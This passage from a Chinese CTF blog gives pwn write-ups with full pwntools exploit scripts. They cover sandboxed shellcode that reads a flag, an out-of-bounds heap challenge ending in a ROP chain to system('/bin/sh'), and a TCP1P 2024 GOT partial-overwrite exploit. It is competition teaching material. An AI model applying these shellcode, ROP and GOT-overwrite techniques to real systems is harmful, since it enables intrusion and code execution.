class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsp, 0x9998200;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x67616c662f2e;</span></span><br><span class="line"><span class="string">push rcx;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi, rax;</span></span><br><span class="line"><span class="string">xor rdi, rdi;</span></span><br><span class="line"><span class="string">inc rdi;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">mov rdx, rsp;</span></span><br><span class="line"><span class="string">mov r10, 0x100;</span></span><br><span class="line"><span class="string">mov rax, 40;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">00000000: 4c87 ff66 ba07 0066 b80a 000f 0599 31c0  L..f...f......1.</span></span><br><span class="line"><span class="string">00000010: 87ce 31ff 0f05                           ..1...</span></span><br><span class="line"><span class="string">4c87ff66ba070066b80a000f059931c087ce31ff0f05</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xchg rdi, r15;</span></span><br><span class="line"><span class="string">mov dx, 0x7;</span></span><br><span class="line"><span class="string">mov ax, 10;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">cdq;</span></span><br><span class="line"><span class="string">xor eax, eax;</span></span><br><span class="line"><span class="string">xchg esi, ecx;</span></span><br><span class="line"><span class="string">xor edi, edi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;&#123;&quot;shellcode&quot;:&quot;4c87ff66ba070066b80a000f059931c087ce31ff0f05&quot;&#125;&quot;&quot;&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\x00&quot;</span> * <span class="number">9</span> + asm(shellcode))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>沙箱shellcode题，沙箱只限制了execve&#x2F;execveat。用json格式输入机器码转化为十六进制的字符串，限制该字符串长度小于44,即原机器码长度小于22.由于在copy之后把机器码地址的写权限关掉了，我们首先需要增加机器码地址的写权限，然后用read再往里边写机器码。用xchg,xor，和cdq可以以非常短的方式构造满足的shellcode, 可以往机器码地址附近输入很长的内容，之后就输入padding+open+sendfile拿到flag.</p>
<hr>
<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h1><blockquote>
<p><del>感觉像临时出的</del></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.dynelf <span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> pwnlib.fmtstr <span class="keyword">import</span> make_atoms_simple</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./guestbook/pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./guestbook/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_dll = cdll.LoadLibrary(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;pwn-2e5d3b8445.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"><span class="comment"># &gt; 0x500</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;size\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;content\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x500</span>)</span><br><span class="line">edit(-<span class="number">4</span>, <span class="string">b&quot;aaaabbb|&quot;</span>)</span><br><span class="line">show(-<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = recv(<span class="string">b&quot;\n&quot;</span>) - <span class="number">0x21B723</span></span><br><span class="line">environ = libc_base + libc.sym.environ</span><br><span class="line">sys = libc.sym.system + libc_base</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">pop_rdi = <span class="number">0x000000000002A3E5</span> + libc_base</span><br><span class="line">ret = <span class="number">0x00000000000F410B</span> + libc_base</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000002a3e5: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x00000000000f410b: ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(-<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">bss_base = recv(<span class="string">b&quot;\n&quot;</span>) - <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">edit(-<span class="number">11</span>, p64(bss_base))</span><br><span class="line">edit(-<span class="number">11</span>, p64(environ))</span><br><span class="line">show(-<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = recv(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">ret_addr = stack_addr - <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">edit(-<span class="number">11</span>, p64(ret_addr))</span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">edit(-<span class="number">12</span>, p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sys))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls(stack_addr)</span><br><span class="line">ls(libc_base)</span><br><span class="line">ls(bss_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>高版本堆，但和堆一点关系都没有。heapsize与heaparray挨着，没有限制越界读写，直接改stderr然后读泄漏libc基地址。bss上有一个指向自己的指针，任意读可得bss基地址，任意写该指针为bss段上某个地址，利用这条链可以完成任意读写。任意读environ得栈地址计算得返回地址，然后往返回地址写ROP链，最后成功getshell</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/14/2024TCP1P/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/14/2024TCP1P/" class="post-title-link" itemprop="url">[TCP1P 2024] Pwn writeup(部分)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-14 23:10:43" itemprop="dateCreated datePublished" datetime="2024-10-14T23:10:43+08:00">2024-10-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-16 21:46:21" itemprop="dateModified" datetime="2024-10-16T21:46:21+08:00">2024-10-16</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="baby-cfhp-🩸"><a href="#baby-cfhp-🩸" class="headerlink" title="baby_cfhp 🩸"></a>baby_cfhp 🩸</h1><hr>
<blockquote>
<p>这竟然让我拿了一血，不过后边还是被薄纱了</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序给了源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ptr;</span><br><span class="line">  <span class="type">int</span> idx, val;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;address: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%li&quot;</span>, &amp;ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;value: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%i&quot;</span>, &amp;val);</span><br><span class="line"></span><br><span class="line">  ptr = (ptr &amp; ~((<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)) |</span><br><span class="line">        ((ptr &amp; <span class="number">0xff</span>) ^ ((val &amp; <span class="number">0xff</span>) ^ ((val &amp; <span class="number">0xff</span>) &gt;&gt; <span class="number">1</span>))) |</span><br><span class="line">        (ptr &amp; <span class="number">0xffff</span> &amp; ~<span class="number">0xff</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有开PIE和Full relro,也没有去除符号.libc从docker里扣出来patch.</p>
<p>程序的逻辑结构很简单，输入ptr和val之后赋值ptr一个复杂的表达式;</p>
<p>对这个表达式逆向分析一下（加个<strong>把每个计算部分输出</strong>的代码编译一份跑一下就行了），发现仅对ptr最低一位的字节进行了修改，且必须在知道ptr原内容的前提下才能正确修改。</p>
<p>修改最低一字节的逆向：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">payload, ptr</span>):</span><br><span class="line">    tmp = payload ^ ptr</span><br><span class="line"></span><br><span class="line">    res1 = tmp &amp; <span class="number">0b1000_0000</span></span><br><span class="line">    res2 = (tmp &amp; <span class="number">0b0100_0000</span>) ^ (res1 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res3 = (tmp &amp; <span class="number">0b0010_0000</span>) ^ (res2 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res4 = (tmp &amp; <span class="number">0b0001_0000</span>) ^ (res3 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res5 = (tmp &amp; <span class="number">0b0000_1000</span>) ^ (res4 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res6 = (tmp &amp; <span class="number">0b0000_0100</span>) ^ (res5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res7 = (tmp &amp; <span class="number">0b0000_0010</span>) ^ (res6 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    res8 = (tmp &amp; <span class="number">0b0000_0001</span>) ^ (res7 &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    res = res1 | res2 | res3 | res4 | res5 | res6 | res7 | res8</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<p>其中payload是我们想要写入的内容，ptr是原ptr指针所指向的内容</p>
<p>这种方式给我们的利用增加了很大的限制：我们必须知道ptr指向的内容才能任意写，而且我们只能写一个字节。这无论是泄漏地址还是构造利用都很困难。</p>
<p>首先需要想办法把一次写变成多次写，做法是修改exit的got表为_start的地址。因为exit未被调用，所以还没有延迟绑定，exit的got表指向plt表附近，而plt表与_start函数离得很近（只有最后一个字节的差异），且程序没开PIE,因此可以修改。修改后便拿到了多次写。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">exit_got = elf.got.exit</span><br><span class="line">main = elf.sym.main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;address: &quot;</span>, <span class="built_in">str</span>(exit_got).encode())</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x70</span></span><br><span class="line">payload = <span class="number">0xD0</span></span><br><span class="line"></span><br><span class="line">tmp = payload ^ ptr</span><br><span class="line"></span><br><span class="line">res1 = tmp &amp; <span class="number">0b1000_0000</span></span><br><span class="line">res2 = (tmp &amp; <span class="number">0b0100_0000</span>) ^ (res1 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res3 = (tmp &amp; <span class="number">0b0010_0000</span>) ^ (res2 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res4 = (tmp &amp; <span class="number">0b0001_0000</span>) ^ (res3 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res5 = (tmp &amp; <span class="number">0b0000_1000</span>) ^ (res4 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res6 = (tmp &amp; <span class="number">0b0000_0100</span>) ^ (res5 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res7 = (tmp &amp; <span class="number">0b0000_0010</span>) ^ (res6 &gt;&gt; <span class="number">1</span>)</span><br><span class="line">res8 = (tmp &amp; <span class="number">0b0000_0001</span>) ^ (res7 &gt;&gt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">res = res1 | res2 | res3 | res4 | res5 | res6 | res7 | res8</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;value: &quot;</span>, <span class="built_in">str</span>(res).encode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来想办法泄漏libc基址，个人认为最麻烦的部分就在这里。由于bss段上和libc地址有关的只有三个FILE指针和got表里的函数地址,故从它们入手。</p>
<p>思路是partial overwrite setbuf函数的got表，把setbuf函数变成gets函数（只有倒数两个字节不一样，需要爆破1&#x2F;16概率），然后修改利用stdout任意读读出libc有关地址，顺便往stderr里边写”&#x2F;bin&#x2F;sh”，然后再修改setbuf的got为system.因为stderr没有用到所以里边的东西不会变，这样在下一轮setbuf执行setbuf(stderr)的时候就能拿到shell.</p>
<ul>
<li>由于init是以__attribute__((constructor))给出的，因此它被注册到了init_array中，在执行_start时有调用链_start -&gt; libc_start_call_main -&gt; init,每次循环都会在main之前执行一次init函数。但是partial overwrite setbuf函数需要写两次（低两位字节），如果在只写完一次之后再次调用的话程序大概率会crash（RE或指令不对齐）,造成不可预知的错误，因此在覆写setbuf的got时不能走main -&gt; exit@got -&gt; _start -&gt; main链，应当换成main -&gt; exit@got -&gt; main链</li>
<li>将exit@got改为main函数同样需要两步。虽然我们已经把末位地址修改了，但尝试修改倒数第二字节地址，让exit@got指向main函数某一位置的行为全都失败了（要么是指令不对齐，要么是没有栈对齐，必须从main函数最开始的地方跳转）。因此，我们决定换一个调用链：exit@got -&gt; __stack_chk_fail@plt -&gt; __stack_chk_fail@got -&gt; main</li>
<li>由于__stack_chk_fail也没有被调用过，因此__stack_chk_fail@got为一个指向plt表附近的<strong>已知地址</strong>，我们能够分两次修改它为main函数地址。之后，还是由于plt表与_start函数离得很近，我们修改exit@got指向__stack_chk_fail@plt，便完成了exit@got -&gt; __stack_chk_fail@plt -&gt; __stack_chk_fail@got -&gt; main调用链，避开了_start函数对init函数的调用，可以安全地partial overwrite setbuf函数。</li>
</ul>
<p>partial overwrite setbuf函数时直接假定后两字节没有偏移就行，还是1&#x2F;16几率。最后再把exit@got指向_start，便可以getshell</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./baby_cfhp/chall&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;/home/NazrinDuck/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="comment"># nc ctf.tcp1p.team 20011</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;ctf.tcp1p.team&quot;</span>, <span class="number">20011</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">payload, ptr</span>):</span><br><span class="line">    tmp = payload ^ ptr</span><br><span class="line"></span><br><span class="line">    res1 = tmp &amp; <span 